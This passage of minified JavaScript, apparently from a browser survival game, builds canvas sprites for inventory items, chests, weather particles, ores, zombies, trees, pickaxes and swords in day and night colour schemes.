        sprite[Ie.CHEST_SWORD_AMETHYST] = sprite[Ie.INV_SWORD_AMETHYST];
        sprite[Ie.CHEST_PICK_WOOD] = sprite[Ie.INV_PICK_WOOD];
        sprite[Ie.CHEST_PICK] = sprite[Ie.INV_PICK];
        sprite[Ie.CHEST_PICK_GOLD] = sprite[Ie.INV_PICK_GOLD];
        sprite[Ie.CHEST_PICK_DIAMOND] = sprite[Ie.INV_PICK_DIAMOND];
        sprite[Ie.CHEST_PICK_AMETHYST] = sprite[Ie.INV_PICK_AMETHYST];
        sprite[Ie.CHEST_STONE] = sprite[Ie.INV_STONE];
        sprite[Ie.CHEST_GOLD] = sprite[Ie.INV_GOLD];
        sprite[Ie.CHEST_DIAMOND] = sprite[Ie.INV_DIAMOND];
        sprite[Ie.CHEST_WOOD] = sprite[Ie.INV_WOOD];
        sprite[Ie.CHEST_PLANT] = sprite[Ie.INV_PLANT];
        sprite[Ie.CHEST_WORKBENCH] = sprite[Ie.INV_WORK];
        sprite[Ie.CHEST_STONE_WALL] = sprite[Ie.INV_STONE_WALL];
        sprite[Ie.CHEST_DIAMOND_WALL] = sprite[Ie.INV_DIAMOND_WALL];
        sprite[Ie.CHEST_GOLD_WALL] = sprite[Ie.INV_GOLD_WALL];
        sprite[Ie.CHEST_AMETHYST_WALL] = sprite[Ie.INV_AMETHYST_WALL];
        sprite[Ie.CHEST_WALL] = sprite[Ie.INV_WALL];
        sprite[Ie.CHEST_SPIKE] = sprite[Ie.INV_SPIKE];
        sprite[Ie.CHEST_MEAT] = sprite[Ie.INV_MEAT];
        sprite[Ie.CHEST_COOKED_MEAT] = sprite[Ie.INV_COOKED_MEAT];
        sprite[Ie.CHEST_CORD] = sprite[Ie.INV_CORD];
        sprite[Ie.CHEST_BLUE_CORD] = sprite[Ie.INV_BLUE_CORD];
        sprite[Ie.CHEST_BANDAGE] = sprite[Ie.INV_BANDAGE];
        sprite[Ie.CHEST_LOCK] = sprite[Ie.INV_LOCK];
        sprite[Ie.CHEST_LOCKPICK] = sprite[Ie.INV_LOCKPICK];
        sprite[Ie.CHEST_RESURRECTION] = sprite[Ie.INV_RESURRECTION];
        sprite[Ie.CHEST_DRAGON_HEART] = sprite[Ie.INV_DRAGON_HEART];
        sprite[Ie.CHEST_LAVA_HEART] = sprite[Ie.INV_LAVA_HEART];
        sprite[Ie.CHEST_DRAGON_SWORD] = sprite[Ie.INV_DRAGON_SWORD];
        sprite[Ie.CHEST_TOTEM] = sprite[Ie.INV_TOTEM];
        sprite[Ie.CHEST_DOOR_WOOD_CLOSE] = sprite[Ie.INV_DOOR_WOOD_CLOSE];
        sprite[Ie.CHEST_CHEST] = sprite[Ie.INV_CHEST];
        sprite[Ie.CHEST_SLOT] = te(function (e, i, t) {
          var r = document.createElement("canvas");
          var n = r.getContext("2d");
          r.width = e * 118;
          r.height = e * 129;
          n.save();
          n.translate(e * 90, e * 90);
          Be(n, e * -86.5, e * -86, e * 110, e * 110, e * 15);
          n.restore();
          ye(n, t[0], t[1], 4);
          n.save();
          Be(n, e * 30, e * 115, e * 60, e * 5, e * 15);
          n.restore();
          ye(n, t[2], t[3], 4);
          n.save();
          Be(n, e * 50, e * 117, e * 20, e * 10, e * 15);
          n.restore();
          ye(n, t[2]);
          return r;
        }(0.8, 0, ["#4c3b19", "#c4a23a", "#c4a23a", "#c4a23a"]));
        sprite[Ie.CHEST_PLUS] = ci(0.5, [{
          f: Bt,
          x: 0,
          y: 2,
          a: 1,
          r: 0,
          c: ["#ffffff"]
        }], 0.16, ["#c4a23a", "#d0ad41", "#b89733"], 0.9);
        sprite[Ie.CHEST_STONE_SPIKE] = sprite[Ie.INV_STONE_SPIKE];
        sprite[Ie.CHEST_GOLD_SPIKE] = sprite[Ie.INV_GOLD_SPIKE];
        sprite[Ie.CHEST_DIAMOND_SPIKE] = sprite[Ie.INV_DIAMOND_SPIKE];
        sprite[Ie.CHEST_AMETHYST_SPIKE] = sprite[Ie.INV_AMETHYST_SPIKE];
        sprite[Ie.CHEST_BAG] = sprite[Ie.INV_BAG];
        sprite[Ie.CHEST_SPECIAL_FUR] = sprite[Ie.INV_SPECIAL_FUR];
        sprite[Ie.CHEST_SPECIAL_FUR_2] = sprite[Ie.INV_SPECIAL_FUR_2];
        sprite[Ie.CHEST_FUR] = sprite[Ie.INV_FUR];
        sprite[Ie.CHEST_KRAKEN_SKIN] = sprite[Ie.INV_KRAKEN_SKIN];
        sprite[Ie.CHEST_FUR_WOLF] = sprite[Ie.INV_FUR_WOLF];
        sprite[Ie.CHEST_FUR_BOAR] = sprite[Ie.INV_FUR_BOAR];
        sprite[Ie.CHEST_FUR_WINTER] = sprite[Ie.INV_FUR_WINTER];
        sprite[Ie.CHEST_EARMUFFS] = sprite[Ie.INV_EARMUFFS];
        sprite[Ie.CHEST_CAP_SCARF] = sprite[Ie.INV_CAP_SCARF];
        sprite[Ie.CHEST_DOOR_STONE_CLOSE] = sprite[Ie.INV_DOOR_STONE_CLOSE];
        sprite[Ie.CHEST_DOOR_GOLD_CLOSE] = sprite[Ie.INV_DOOR_GOLD_CLOSE];
        sprite[Ie.CHEST_DOOR_DIAMOND_CLOSE] = sprite[Ie.INV_DOOR_DIAMOND_CLOSE];
        sprite[Ie.CHEST_DOOR_AMETHYST_CLOSE] = sprite[Ie.INV_DOOR_AMETHYST_CLOSE];
        sprite[Ie.CHEST_COAT] = sprite[Ie.INV_COAT];
        sprite[Ie.CHEST_WOOD_SPEAR] = sprite[Ie.INV_WOOD_SPEAR];
        sprite[Ie.CHEST_SPEAR] = sprite[Ie.INV_SPEAR];
        sprite[Ie.CHEST_GOLD_SPEAR] = sprite[Ie.INV_GOLD_SPEAR];
        sprite[Ie.CHEST_DIAMOND_SPEAR] = sprite[Ie.INV_DIAMOND_SPEAR];
        sprite[Ie.CHEST_AMETHYST_SPEAR] = sprite[Ie.INV_AMETHYST_SPEAR];
        sprite[Ie.CHEST_DRAGON_SPEAR] = sprite[Ie.INV_DRAGON_SPEAR];
        sprite[Ie.CHEST_SUPER_HAMMER] = sprite[Ie.INV_SUPER_HAMMER];
        sprite[Ie.CHEST_SPANNER] = sprite[Ie.INV_SPANNER];
        sprite[Ie.CHEST_HAMMER] = sprite[Ie.INV_HAMMER];
        sprite[Ie.CHEST_HAMMER_GOLD] = sprite[Ie.INV_HAMMER_GOLD];
        sprite[Ie.CHEST_HAMMER_DIAMOND] = sprite[Ie.INV_HAMMER_DIAMOND];
        sprite[Ie.CHEST_HAMMER_AMETHYST] = sprite[Ie.INV_HAMMER_AMETHYST];
        sprite[Ie.CHEST_FURNACE] = sprite[Ie.INV_FURNACE];
        sprite[Ie.CHEST_BREAD_OVEN] = sprite[Ie.INV_BREAD_OVEN];
        sprite[Ie.CHEST_EXPLORER_HAT] = sprite[Ie.INV_EXPLORER_HAT];
        sprite[Ie.CHEST_STONE_HELMET] = sprite[Ie.INV_STONE_HELMET];
        sprite[Ie.CHEST_GOLD_HELMET] = sprite[Ie.INV_GOLD_HELMET];
        sprite[Ie.CHEST_DIAMOND_HELMET] = sprite[Ie.INV_DIAMOND_HELMET];
        sprite[Ie.CHEST_AMETHYST_HELMET] = sprite[Ie.INV_AMETHYST_HELMET];
        sprite[Ie.CHEST_DRAGON_HELMET] = sprite[Ie.INV_DRAGON_HELMET];
        sprite[Ie.CHEST_BOOK] = sprite[Ie.INV_BOOK];
        sprite[Ie.CHEST_PAPER] = sprite[Ie.INV_PAPER];
        sprite[Ie.CHEST_AMETHYST] = sprite[Ie.INV_AMETHYST];
        sprite[Ie.CHEST_BRIDGE] = sprite[Ie.INV_BRIDGE];
        sprite[Ie.CHEST_ROOF] = sprite[Ie.INV_ROOF];
        sprite[Ie.CHEST_PLOT] = sprite[Ie.INV_PLOT];
        sprite[Ie.CHEST_SAND] = sprite[Ie.INV_SAND];
        sprite[Ie.CHEST_BREAD] = sprite[Ie.INV_BREAD];
        sprite[Ie.CHEST_ICE] = sprite[Ie.INV_ICE];
        sprite[Ie.CHEST_GROUND] = sprite[Ie.INV_GROUND];
        sprite[Ie.CHEST_BOTTLE_FULL] = sprite[Ie.INV_BOTTLE_FULL];
        sprite[Ie.CHEST_BOTTLE_EMPTY] = sprite[Ie.INV_BOTTLE_EMPTY];
        sprite[Ie.CHEST_WATERING_CAN] = sprite[Ie.INV_WATERING_CAN];
        sprite[Ie.CHEST_FLOUR] = sprite[Ie.INV_FLOUR];
        sprite[Ie.CHEST_COOKIE] = sprite[Ie.INV_COOKIE];
        sprite[Ie.CHEST_CANDY] = sprite[Ie.INV_CANDY];
        sprite[Ie.CHEST_FERRERO] = sprite[Ie.INV_FERRERO];
        sprite[Ie.CHEST_SUPER_DIVING_SUIT] = sprite[Ie.INV_SUPER_DIVING_SUIT];
        sprite[Ie.CHEST_DIVING_MASK] = sprite[Ie.INV_DIVING_MASK];
        sprite[Ie.CHEST_WATERING_CAN_FULL] = sprite[Ie.INV_WATERING_CAN_FULL];
        sprite[Ie.CHEST_CAKE] = sprite[Ie.INV_CAKE];
        sprite[Ie.CHEST_CRAB_STICK] = sprite[Ie.INV_CRAB_STICK];
        sprite[Ie.CHEST_FOODFISH] = sprite[Ie.INV_FOODFISH];
        sprite[Ie.CHEST_FOODFISH_COOKED] = sprite[Ie.INV_FOODFISH_COOKED];
        sprite[Ie.CHEST_SCALES] = sprite[Ie.INV_SCALES];
        sprite[Ie.CHEST_SANDWICH] = sprite[Ie.INV_SANDWICH];
        sprite[Ie.CHEST_CROWN_GREEN] = sprite[Ie.INV_CROWN_GREEN];
        sprite[Ie.CHEST_GEMME_GREEN] = sprite[Ie.INV_GEMME_GREEN];
        sprite[Ie.CHEST_CROWN_ORANGE] = sprite[Ie.INV_CROWN_ORANGE];
        sprite[Ie.CHEST_GEMME_ORANGE] = sprite[Ie.INV_GEMME_ORANGE];
        sprite[Ie.CHEST_CROWN_BLUE] = sprite[Ie.INV_CROWN_BLUE];
        sprite[Ie.CHEST_GEMME_BLUE] = sprite[Ie.INV_GEMME_BLUE];
        sprite[Ie.CHEST_HOOD] = sprite[Ie.INV_HOOD];
        sprite[Ie.CHEST_PEASANT] = sprite[Ie.INV_PEASANT];
        sprite[Ie.CHEST_WINTER_PEASANT] = sprite[Ie.INV_WINTER_PEASANT];
        sprite[Ie.CHEST_WINTER_HOOD] = sprite[Ie.INV_WINTER_HOOD];
        sprite[Ie.CHEST_BUCKET_EMPTY] = sprite[Ie.INV_BUCKET_EMPTY];
        sprite[Ie.CHEST_BUCKET_FULL] = sprite[Ie.INV_BUCKET_FULL];
        sprite[Ie.CHEST_WELL] = sprite[Ie.INV_WELL];
        sprite[Ie.CHEST_SIGN] = sprite[Ie.INV_SIGN];
        sprite[Ie.CHEST_PUMPKIN_SEED] = sprite[Ie.INV_PUMPKIN_SEED];
        sprite[Ie.CHEST_GARLIC_SEED] = sprite[Ie.INV_GARLIC_SEED];
        sprite[Ie.CHEST_THORNBUSH_SEED] = sprite[Ie.INV_THORNBUSH_SEED];
        sprite[Ie.CHEST_WOOD_HELMET] = sprite[Ie.INV_WOOD_HELMET];
      })();
      sprite[Ie.BUBBLES] = [];
      sprite[Ie.BUBBLES][Ie.DAY] = [];
      sprite[Ie.BUBBLES][Ie.NIGHT] = [];
      for (var i = 0; i < Ie.BUBBLES_SIZES; i++) {
        sprite[Ie.BUBBLES][Ie.DAY].push(te(ot(1, 4 + i, "#59B8CE")));
        sprite[Ie.BUBBLES][Ie.NIGHT].push(te(ot(1, 4 + i, "#90DDD9")));
      }
      sprite[Ie.FLAKES] = [];
      sprite[Ie.FLAKES][Ie.DAY] = [];
      sprite[Ie.FLAKES][Ie.NIGHT] = [];
      for (i = 0; i < Ie.FLAKES_SIZES; i++) {
        sprite[Ie.FLAKES][Ie.DAY].push(te(ot(1, 4 + i, "#fff")));
        sprite[Ie.FLAKES][Ie.NIGHT].push(te(ot(1, 4 + i, "#fff")));
      }
      sprite[Ie.DESERT] = [];
      sprite[Ie.DESERT][Ie.DAY] = [];
      sprite[Ie.DESERT][Ie.NIGHT] = [];
      for (i = 0; i < Ie.FLAKES_SIZES; i++) {
        sprite[Ie.DESERT][Ie.DAY].push(te(ot(1, 6 + i, "#DDCD8A")));
        sprite[Ie.DESERT][Ie.NIGHT].push(te(ot(1, 6 + i, "#155E57")));
      }
      sprite[Ie.ASHES] = [];
      sprite[Ie.ASHES][Ie.DAY] = [];
      sprite[Ie.ASHES][Ie.NIGHT] = [];
      for (i = 0; i < Ie.ASHES_SIZES; i++) {
        sprite[Ie.ASHES][Ie.DAY].push(te(ot(1, 4 + i, "#353326")));
        sprite[Ie.ASHES][Ie.NIGHT].push(te(ot(1, 4 + i, "#1D2526")));
      }
      sprite[Ie.GARLAND] = [];
      sprite[Ie.GARLAND][Ie.DAY] = te(Fe(1.5, 0, ["#ee71a9"]));
      sprite[Ie.GARLAND][Ie.NIGHT] = te(Fe(1.5, 0, ["#ee71a9"]));
      sprite[Ie.GARLANDS] = [sprite[Ie.GARLAND]];
      sprite[Ie.GARLANDS][1] = [];
      sprite[Ie.GARLANDS][2] = [];
      sprite[Ie.GARLANDS][3] = [];
      sprite[Ie.GARLANDS][4] = [];
      sprite[Ie.GARLANDS][1][Ie.DAY] = te(Fe(1.5, 0, ["#e2d63b"]));
      sprite[Ie.GARLANDS][1][Ie.NIGHT] = te(Fe(1.5, 0, ["#e2d63b"]));
      sprite[Ie.GARLANDS][2][Ie.DAY] = te(Fe(1.5, 0, ["#309cbd"]));
      sprite[Ie.GARLANDS][2][Ie.NIGHT] = te(Fe(1.5, 0, ["#309cbd"]));
      sprite[Ie.GARLANDS][3][Ie.DAY] = te(Fe(1.5, 0, ["#cd232d"]));
      sprite[Ie.GARLANDS][3][Ie.NIGHT] = te(Fe(1.5, 0, ["#cd232d"]));
      sprite[Ie.GARLANDS][4][Ie.DAY] = te(Fe(1.5, 0, ["#42b672"]));
      sprite[Ie.GARLANDS][4][Ie.NIGHT] = te(Fe(1.5, 0, ["#42b672"]));
      if (Utils.gup("cti", window.location.href)) {
        document.getElementById("version").innerHTML += "[CTI]";
      } else {
        te = function (e) {
          e.loaded = 1;
          return e;
        };
      }
      sprite[Ie.MARKET_BGD] = te(function () {
        var e = document.createElement("canvas");
        var i = e.getContext("2d");
        e.width = 460;
        e.height = 220;
        i.fillStyle = "#3a2a0d";
        i.fillRect(0, 0, e.width, e.height);
        i.lineWidth = 4;
        i.beginPath();
        i.strokeStyle = "#513810";
        for (var t = 20; t < 220; t += 20) {
          i.moveTo(0, t);
          i.lineTo(460, t);
          i.closePath();
          i.stroke();
        }
        return e;
      }());
      sprite[Ie.STONES] = [];
      sprite[Ie.STONES][Ie.DAY] = [];
      sprite[Ie.STONES][Ie.NIGHT] = [];
      sprite[Ie.STONES][Ie.DAY].push(te(Qi(1.1, 0, ["#0a2d18", "#c3d1cb", "#e4efe8"])));
      sprite[Ie.STONES][Ie.DAY].push(te(Qi(0.9, 0, ["#0a2d18", "#c3d1cb", "#e4efe8"])));
      sprite[Ie.STONES][Ie.DAY].push(te(Qi(0.6, 0, ["#0a2d18", "#c3d1cb", "#e4efe8"])));
      sprite[Ie.STONES][Ie.NIGHT].push(te(Qi(1.1, 0, ["#0a2728", "#3c8e88", "#40a39b"])));
      sprite[Ie.STONES][Ie.NIGHT].push(te(Qi(0.9, 0, ["#0a2728", "#3c8e88", "#40a39b"])));
      sprite[Ie.STONES][Ie.NIGHT].push(te(Qi(0.6, 0, ["#0a2728", "#3c8e88", "#40a39b"])));
      sprite[Ie.GOLD] = [];
      sprite[Ie.GOLD][Ie.DAY] = [];
      sprite[Ie.GOLD][Ie.NIGHT] = [];
      sprite[Ie.GOLD][Ie.DAY].push(te(et(1.5, 0, ["#2b280a", "#ddcf8a", "#f4efc6"])));
      sprite[Ie.GOLD][Ie.DAY].push(te(et(1.3, 0, ["#2b280a", "#ddcf8a", "#f4efc6"])));
      sprite[Ie.GOLD][Ie.DAY].push(te(et(1.1, 0, ["#2b280a", "#ddcf8a", "#f4efc6"])));
      sprite[Ie.GOLD][Ie.NIGHT].push(te(et(1.5, 0, ["#030d14", "#1b4444", "#16605a"])));
      sprite[Ie.GOLD][Ie.NIGHT].push(te(et(1.3, 0, ["#030d14", "#1b4444", "#16605a"])));
      sprite[Ie.GOLD][Ie.NIGHT].push(te(et(1.1, 0, ["#030d14", "#1b4444", "#16605a"])));
      sprite[Ie.DIAMOND] = [];
      sprite[Ie.DIAMOND][Ie.DAY] = [];
      sprite[Ie.DIAMOND][Ie.NIGHT] = [];
      sprite[Ie.DIAMOND][Ie.DAY].push(te(it(1.1, 0, ["#232828", "#3fc9c9", "#74ede6"])));
      sprite[Ie.DIAMOND][Ie.DAY].push(te(it(0.9, 0, ["#232828", "#3fc9c9", "#74ede6"])));
      sprite[Ie.DIAMOND][Ie.DAY].push(te(it(0.7, 0, ["#232828", "#3fc9c9", "#74ede6"])));
      sprite[Ie.DIAMOND][Ie.NIGHT].push(te(it(1.1, 0, ["#030d14", "#2b9390", "#57bcb5"])));
      sprite[Ie.DIAMOND][Ie.NIGHT].push(te(it(0.9, 0, ["#030d14", "#2b9390", "#57bcb5"])));
      sprite[Ie.DIAMOND][Ie.NIGHT].push(te(it(0.7, 0, ["#030d14", "#2b9390", "#57bcb5"])));
      sprite[Ie.ALOE_VERA] = [];
      sprite[Ie.ALOE_VERA][Ie.DAY] = IMAGES.ALOE_VERAD;
      sprite[Ie.ALOE_VERA][Ie.NIGHT] = IMAGES.ALOE_VERAN;
      sprite[Ie.HAND_SHADOW] = [];
      sprite[Ie.HAND_SHADOW][Ie.DAY] = te(vi(0.6, ["#0d1b1c"]));
      sprite[Ie.HAND_SHADOW][Ie.NIGHT] = te(vi(0.6, ["#030d14"]));
      sprite[Ie.GLOVES_HOOD] = [];
      sprite[Ie.GLOVES_HOOD][Ie.DAY] = te(mi(0.6, ["#2a2938", "#242330"]));
      sprite[Ie.GLOVES_HOOD][Ie.NIGHT] = te(mi(0.6, ["#1b1e30", "#161921"]));
      sprite[Ie.ZOMBIE_BODY] = [];
      sprite[Ie.ZOMBIE_BODY][Ie.DAY] = te(je(0.6, 0, ["#0d1b1c", "#759e6e", "#55604b", "#7d7252", "#575043"]));
      sprite[Ie.ZOMBIE_BODY][Ie.NIGHT] = te(je(0.6, 0, ["#030d14", "#11635e", "#02373e", "#0b524d", "#07423f"]));
      sprite[Ie.ZOMBIE_HEAD] = [];
      sprite[Ie.ZOMBIE_HEAD][Ie.DAY] = te(qe(0.6, 0, ["#0d1b1c", "#759e6e", "#55604b", "#f9ccd4", "#891a1e", "#da232e", "#a52026", "#a02d28", "#721819", "#FFFFFF"]));
      sprite[Ie.ZOMBIE_HEAD][Ie.NIGHT] = te(qe(0.6, 0, ["#030d14", "#11635e", "#02373e", "#167771", "#0c5752", "#401d49", "#2e1336", "#261336", "#23163c", "#FFFFFF"]));
      sprite[Ie.ZOMBIE_HAND] = [];
      sprite[Ie.ZOMBIE_HAND][Ie.DAY] = te(pi(0.4, ["#0d1b1c", "#759e6e", "#55604b"]));
      sprite[Ie.ZOMBIE_HAND][Ie.NIGHT] = te(pi(0.4, ["#030d14", "#11635e", "#02373e"]));
      sprite[Ie.ZOMBIE_HURT] = te(Ze(0.6, ["#BB0000"]));
      sprite[Ie.ZOMBIE_HUNGER] = te(Ze(0.6, ["#DBE71C"]));
      sprite[Ie.ZOMBIE_HEAL] = te(Ze(0.6, ["#00BB00"]));
      sprite[Ie.TREE] = [];
      sprite[Ie.TREE][Ie.DAY] = [];
      sprite[Ie.TREE][Ie.NIGHT] = [];
      sprite[Ie.TREE][Ie.DAY].push(Mi(1.1, ["#13402d", "#0f9862", "#0b8750", "#26ab6e"], false, 0));
      sprite[Ie.TREE][Ie.DAY].push(Mi(1.1, ["#0e3022", "#0f9862", "#0b8750", "#26ab6e"], true, 0));
      sprite[Ie.TREE][Ie.DAY].push(Mi(0.9, ["#0e3022", "#0e7d4c", "#258a4d", "#248c4d"], false, 0));
      sprite[Ie.TREE][Ie.DAY].push(Mi(0.9, ["#0e3022", "#096d41", "#1f7b43", "#1f7b43"], true, 0));
      sprite[Ie.TREE][Ie.DAY].push(Mi(0.7, ["#0e3022", "#124c34", "#0E3D26", "#155136"], false, 0));
      sprite[Ie.TREE][Ie.DAY].push(Mi(0.7, ["#0e3022", "#124c34", "#0E3D26", "#155136"], true, 0));
      sprite[Ie.TREE][Ie.NIGHT].push(Mi(1.1, ["#030d14", "#124949", "#0e3838", "#15514f"], false, 0));
      sprite[Ie.TREE][Ie.NIGHT].push(Mi(1.1, ["#030d14", "#124949", "#0e3838", "#15514f"], true, 0));
      sprite[Ie.TREE][Ie.NIGHT].push(Mi(0.9, ["#030d14", "#0b3534", "#144443", "#174240"], false, 0));
      sprite[Ie.TREE][Ie.NIGHT].push(Mi(0.9, ["#030d14", "#0b3534", "#144443", "#174240"], true, 0));
      sprite[Ie.TREE][Ie.NIGHT].push(Mi(0.7, ["#030d14", "#082b29", "#073332", "#073332"], false, 0));
      sprite[Ie.TREE][Ie.NIGHT].push(Mi(0.7, ["#030d14", "#082b29", "#073332", "#073332"], true, 0));
      sprite[Ie.TREE_BRANCH] = [];
      sprite[Ie.TREE_BRANCH][Ie.DAY] = [];
      sprite[Ie.TREE_BRANCH][Ie.NIGHT] = [];
      sprite[Ie.TREE_BRANCH][Ie.DAY].push(te(fi(Gi(1.1, ["#0e3022", "#4d2d14", "#432516", "#096d41", "#08562e", "#107746"], false), sprite[Ie.TREE][Ie.DAY][0])));
      sprite[Ie.TREE_BRANCH][Ie.DAY].push(te(fi(Gi(1.1, ["#0e3022", "#4d2d14", "#432516", "#096d41", "#08562e", "#107746"], true), sprite[Ie.TREE][Ie.DAY][1])));
      sprite[Ie.TREE_BRANCH][Ie.NIGHT].push(te(fi(Gi(1.1, ["#030d14", "#031619", "#041c21", "#0a3333", "#113f3c", "#113f3c"], false), sprite[Ie.TREE][Ie.NIGHT][0])));
      sprite[Ie.TREE_BRANCH][Ie.NIGHT].push(te(fi(Gi(1.1, ["#030d14", "#031619", "#041c21", "#0a3333", "#113f3c", "#113f3c"], true), sprite[Ie.TREE][Ie.NIGHT][1])));
      sprite[Ie.TREE_BRANCH][Ie.DAY].push(te(fi(Gi(0.9, ["#0e3022", "#4d2d14", "#432516", "#096d41", "#107746", "#107746"], false), sprite[Ie.TREE][Ie.DAY][2])));
      sprite[Ie.TREE_BRANCH][Ie.DAY].push(te(fi(Gi(0.9, ["#0e3022", "#4d2d14", "#432516", "#096d41", "#107746", "#107746"], true), sprite[Ie.TREE][Ie.DAY][2])));
      sprite[Ie.TREE_BRANCH][Ie.NIGHT].push(te(fi(Gi(0.9, ["#030d14", "#031619", "#041c21", "#082b29", "#083b3a", "#083b3a"], false), sprite[Ie.TREE][Ie.NIGHT][2])));
      sprite[Ie.TREE_BRANCH][Ie.NIGHT].push(te(fi(Gi(0.9, ["#030d14", "#031619", "#041c21", "#082b29", "#083b3a", "#083b3a"], true), sprite[Ie.TREE][Ie.NIGHT][3])));
      sprite[Ie.TREE][Ie.DAY][5] = te(sprite[Ie.TREE][Ie.DAY][5]);
      sprite[Ie.TREE][Ie.DAY][4] = te(sprite[Ie.TREE][Ie.DAY][4]);
      sprite[Ie.TREE][Ie.DAY][3] = te(sprite[Ie.TREE][Ie.DAY][3]);
      sprite[Ie.TREE][Ie.DAY][2] = te(sprite[Ie.TREE][Ie.DAY][2]);
      sprite[Ie.TREE][Ie.DAY][1] = te(sprite[Ie.TREE][Ie.DAY][1]);
      sprite[Ie.TREE][Ie.DAY][0] = te(sprite[Ie.TREE][Ie.DAY][0]);
      sprite[Ie.TREE][Ie.NIGHT][5] = te(sprite[Ie.TREE][Ie.NIGHT][5]);
      sprite[Ie.TREE][Ie.NIGHT][4] = te(sprite[Ie.TREE][Ie.NIGHT][4]);
      sprite[Ie.TREE][Ie.NIGHT][3] = te(sprite[Ie.TREE][Ie.NIGHT][3]);
      sprite[Ie.TREE][Ie.NIGHT][2] = te(sprite[Ie.TREE][Ie.NIGHT][2]);
      sprite[Ie.TREE][Ie.NIGHT][1] = te(sprite[Ie.TREE][Ie.NIGHT][1]);
      sprite[Ie.TREE][Ie.NIGHT][0] = te(sprite[Ie.TREE][Ie.NIGHT][0]);
      sprite[Ie.PICK_WOOD] = [];
      sprite[Ie.PICK_WOOD][Ie.DAY] = te(we(4, Hi(0.75, true, ["#0d1b1c", "#000000", "#0d1b1c", "#4d2d14", "#432516", "#4d2d14", "#432516"])));
      sprite[Ie.PICK_WOOD][Ie.NIGHT] = te(we(4, Hi(0.75, true, ["#030d14", "#000000", "#030d14", "#0d2e33", "#0b2326", "#0d2e33", "#0b2326"])));
      sprite[Ie.PICK] = [];
      sprite[Ie.PICK][Ie.DAY] = te(we(4, Hi(0.75, true, ["#0d1b1c", "#000000", "#0d1b1c", "#4d2d14", "#432516", "#939393", "#5f6061"])));
      sprite[Ie.PICK][Ie.NIGHT] = te(we(4, Hi(0.75, true, ["#030d14", "#000000", "#030d14", "#0d2e33", "#0b2326", "#485e66", "#1f343f"])));
      sprite[Ie.PICK_GOLD] = [];
      sprite[Ie.PICK_GOLD][Ie.DAY] = te(we(4, Hi(0.75, true, ["#0d1b1c", "#000000", "#0d1b1c", "#493e26", "#382e19", "#c4bc51", "#b29c32"])));
      sprite[Ie.PICK_GOLD][Ie.NIGHT] = te(we(4, Hi(0.75, true, ["#030d14", "#000000", "#030d14", "#263947", "#263947", "#43aa82", "#29997c"])));
      sprite[Ie.PICK_DIAMOND] = [];
      sprite[Ie.PICK_DIAMOND][Ie.DAY] = te(we(4, Hi(0.75, true, ["#0d1b1c", "#000000", "#0d1b1c", "#262114", "#211108", "#63c9d6", "#29aaa1"])));
      sprite[Ie.PICK_DIAMOND][Ie.NIGHT] = te(we(4, Hi(0.75, true, ["#030d14", "#000000", "#030d14", "#111316", "#0a0b0c", "#73dde5", "#3dc4c0"])));
      sprite[Ie.PICK_AMETHYST] = [];
      sprite[Ie.PICK_AMETHYST][Ie.DAY] = te(we(4, Hi(0.75, true, ["#0d1b1c", "#000000", "#0d1b1c", "#262114", "#211108", "#b864d6", "#8c29aa"])));
      sprite[Ie.PICK_AMETHYST][Ie.NIGHT] = te(we(4, Hi(0.75, true, ["#030d14", "#000000", "#030d14", "#111316", "#0a0b0c", "#8359d3", "#764eb5"])));
      sprite[Ie.PIRATE_SWORD] = [];
      sprite[Ie.PIRATE_SWORD][Ie.DAY] = te(we(3, yi(0.17, true, ["#0d1b1c", "#4a3a22", "#362818", "#c7c7c7", "#909090", "#eceaea", "#bbbbbb", "#d6d1d1"])));
      sprite[Ie.PIRATE_SWORD][Ie.NIGHT] = te(we(3, yi(0.17, true, ["#0d1b1c", "#0d2e33", "#0b2326", "#59737d", "#364f59", "#618395", "#4d768c", "#54859f"])));
      sprite[Ie.SUGAR_CAN] = [];
      sprite[Ie.SUGAR_CAN][Ie.DAY] = te(we(3, xi(0.32, true, ["#0d1b1c", "#ffffff", "#5f6061", "#eb2933", "#57b74e", "#42a54d", "#ac222a", "#e6636a"])));
      sprite[Ie.SUGAR_CAN][Ie.NIGHT] = te(we(3, xi(0.42, true, ["#0d1b1c", "#485e66", "#1f343f", "#0d2e33", "#0b2326"])));
      sprite[Ie.SWORD_WOOD] = [];
      sprite[Ie.SWORD_WOOD][Ie.DAY] = te(we(3, Pi(0.4, true, ["#0d1b1c", "#73583e", "#493425", "#7d6144", "#5e4530", "#473221", "#745840"])));
      sprite[Ie.SWORD_WOOD][Ie.NIGHT] = te(we(3, Pi(0.4, true, ["#0d1b1c", "#0b3d3a", "#092b2a", "#144642", "#082927", "#092b29"])));
      sprite[Ie.SWORD] = [];
      sprite[Ie.SWORD][Ie.DAY] = te(we(3, zi(0.4, true, ["#0d1b1c", "#939393", "#5f6061", "#b1afaf", "#493d36", "#332b28"])));
      sprite[Ie.SWORD][Ie.NIGHT] = te(we(3, zi(0.4, true, ["#0d1b1c", "#485e66", "#1f343f", "#5d757e", "#0d2e33", "#0b2326"])));
      sprite[Ie.SWORD_GOLD] = [];
      sprite[Ie.SWORD_GOLD][Ie.DAY] = te(we(3, Yi(0.4, true, ["#0d1b1c", "#c4bc51", "#b29c32", "#c4bc51", "#493e26", "#382e19"])));
      sprite[Ie.SWORD_GOLD][Ie.NIGHT] = te(we(3, Yi(0.4, true, ["#0d1b1c", "#43aa82", "#29997c", "#54bf96", "#263947", "#182935"])));
      sprite[Ie.SWORD_DIAMOND] = [];
      sprite[Ie.SWORD_DIAMOND][Ie.DAY] = te(we(3, ki(0.4, true, ["#0d1b1c", "#6ad9e8", "#29aaa1", "#95e9f5", "#022320", "#011e19", "#FFFFFF"])));
      sprite[Ie.SWORD_DIAMOND][Ie.NIGHT] = te(we(3, ki(0.4, true, ["#0d1b1c", "#73dde5", "#3dc4c0", "#93eaf1", "#111316", "#0a0b0c"])));
      sprite[Ie.SWORD_AMETHYST] = [];
      sprite[Ie.SWORD_AMETHYST][Ie.DAY] = te(we(3, Fi(0.4, true, ["#0d1b1c", "#b864d6", "#8c29aa", "#cc81e7", "#262114", "#211108", "#FFFFFF"])));
      sprite[Ie.SWORD_AMETHYST][Ie.NIGHT] = te(we(3, Fi(0.4, true, ["#0d1b1c", "#8359d3", "#764eb5", "#966de6", "#111316", "#0a0b0c"])));
      sprite[Ie.HERB] = [];
      sprite[Ie.HERB][Ie.DAY] = [];
      sprite[Ie.HERB][Ie.NIGHT] = [];
      sprite[Ie.HERB][Ie.DAY].push(te(at(0.9, 0, ["#0d4f35"], 0)));
      sprite[Ie.HERB][Ie.DAY].push(te(at(0.9, 0, ["#0d4f35"], 1)));
